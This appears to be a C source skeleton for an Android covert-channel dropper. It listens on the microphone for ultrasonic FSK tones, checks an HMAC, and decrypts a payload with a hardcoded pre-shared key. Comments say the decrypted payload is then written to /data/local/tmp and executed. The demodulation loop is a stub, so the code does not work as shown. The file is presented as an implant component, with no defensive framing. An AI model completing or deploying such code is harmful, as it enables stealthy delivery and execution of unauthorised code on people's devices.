#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>
#include <aaudio/AAudio.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>

#define SAMPLE_RATE 44100
#define CHANNELS 1
#define WINDOW_SAMPLES 441  /* 10 ms at 44100 Hz */
#define MARK_FREQ 18500.0
#define SPACE_FREQ 19500.0
#define PREAMBLE_LEN 6
#define POSTAMBLE_LEN 3
#define MAX_PAYLOAD 64
#define OUT_PATH "/data/local/tmp/xbug-boot"

static const int PREAMBLE[] = {3, 1, 3, 1, 3, 1};
static const int POSTAMBLE[] = {1, 1, 1};

/* Goertzel detector */
typedef struct { double coeff; double s1, s2; int n; } Goertzel;

static void goertzel_init(Goertzel *g, double freq, int N, int sample_rate) {
    double w = 2.0 * M_PI * freq / sample_rate;
    g->coeff = 2.0 * cos(w);
    g->s1 = g->s2 = 0.0;
    g->n = N;
}

static void goertzel_feed(Goertzel *g, int16_t sample) {
    double x = (double)sample;
    double s0 = x + g->coeff * g->s1 - g->s2;
    g->s2 = g->s1;
    g->s1 = s0;
}

static double goertzel_mag(const Goertzel *g) {
    return sqrt(g->s1 * g->s1 + g->s2 * g->s2 - g->coeff * g->s1 * g->s2);
}

/* Keystream (matches Python _keystream) */
static void keystream(const unsigned char *psk, size_t psklen,
                      const unsigned char *nonce, size_t noncelen,
                      unsigned char *out, size_t length) {
    size_t produced = 0;
    unsigned int counter = 0;
    while (produced < length) {
        /* SHA256(psk || nonce || counter as big-endian uint32) */
        unsigned char buf[256];
        size_t off = 0;
        memcpy(buf + off, psk, psklen); off += psklen;
        memcpy(buf + off, nonce, noncelen); off += noncelen;
        buf[off++] = (counter >> 24) & 0xFF;
        buf[off++] = (counter >> 16) & 0xFF;
        buf[off++] = (counter >> 8) & 0xFF;
        buf[off++] = counter & 0xFF;
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256(buf, off, hash);
        size_t tocopy = SHA256_DIGEST_LENGTH;
        if (tocopy > length - produced) tocopy = length - produced;
        memcpy(out + produced, hash, tocopy);
        produced += tocopy;
        counter++;
    }
}

static int decrypt(const unsigned char *blob, size_t bloblen,
                   const unsigned char *psk, size_t psklen,
                   unsigned char *out, size_t *outlen) {
    if (bloblen < 16) return -1; /* 8 nonce + 8 mac minimum */
    const unsigned char *nonce = blob;
    const unsigned char *mac = blob + bloblen - 8;
    const unsigned char *ct = blob + 8;
    size_t ctlen = bloblen - 16;

    /* HMAC-SHA256(psk, nonce||ct) truncated to 8 bytes */
    unsigned char hmac_buf[SHA256_DIGEST_LENGTH];
    unsigned int hmac_len = 0;
    HMAC(EVP_sha256(), psk, (int)psklen, blob, 8 + ctlen, hmac_buf, &hmac_len);
    if (memcmp(hmac_buf, mac, 8) != 0) return -2; /* MAC mismatch */

    keystream(psk, psklen, nonce, 8, out, ctlen);
    for (size_t i = 0; i < ctlen; i++) out[i] ^= ct[i];
    *outlen = ctlen;
    return 0;
}

/* CRC16 (matches Python crc16) */
static unsigned int crc16(const unsigned char *data, size_t len) {
    unsigned int crc = 0;
    for (size_t i = 0; i < len; i++) {
        crc ^= (unsigned int)data[i] << 8;
        for (int j = 0; j < 8; j++) {
            if (crc & 0x8000) crc = ((crc << 1) ^ 0x8005) & 0xFFFF;
            else crc = (crc << 1) & 0xFFFF;
        }
    }
    return crc;
}

/* AAudio callback */
static int32_t dataCallback(AAudioStream *stream, void *userData, void *audioData, int32_t numFrames) {
    int16_t *samples = (int16_t *)audioData;
    /* Process in 10 ms windows */
    /* (simplified: store samples for main loop) */
    (void)stream; (void)userData; (void)samples; (void)numFrames;
    return AAUDIO_CALLBACK_RESULT_CONTINUE;
}

int main(int argc, char **argv) {
    const unsigned char psk[] = "bugxhunter-drop-psk-32bytes-long!!"; /* placeholder; real PSK injected */
    size_t psklen = strlen((const char *)psk);

    AAudioStreamBuilder *builder;
    AAudio_createStreamBuilder(&builder);
    AAudioStreamBuilder_setDirection(builder, AAUDIO_DIRECTION_INPUT);
    AAudioStreamBuilder_setSampleRate(builder, SAMPLE_RATE);
    AAudioStreamBuilder_setChannelCount(builder, CHANNELS);
    AAudioStreamBuilder_setFormat(builder, AAUDIO_FORMAT_PCM_I16);
    AAudioStreamBuilder_setDataCallback(builder, dataCallback, NULL);

    AAudioStream *stream;
    aaudio_result_t result = AAudioStreamBuilder_openStream(builder, &stream);
    if (result != AAUDIO_OK) {
        fprintf(stderr, "Failed to open stream: %s\n", AAudio_convertResultToText(result));
        return 1;
    }
    AAudioStream_requestStart(stream);

    /* Main demodulation loop would go here:
     * 1. Read samples from AAudio
     * 2. Run Goertzel on 441-sample windows
     * 3. Determine bit = mark > space
     * 4. Accumulate bits, detect preamble, parse frame, decrypt, write, execve
     *
     * For a complete implementation this requires a real-time sample buffer
     * and state machine. The skeleton above provides the building blocks.
     */

    /* Placeholder: in production, loop until full frame received */
    sleep(30);

    AAudioStream_requestStop(stream);
    AAudioStream_close(stream);
    AAudioStreamBuilder_delete(builder);
    return 0;
}
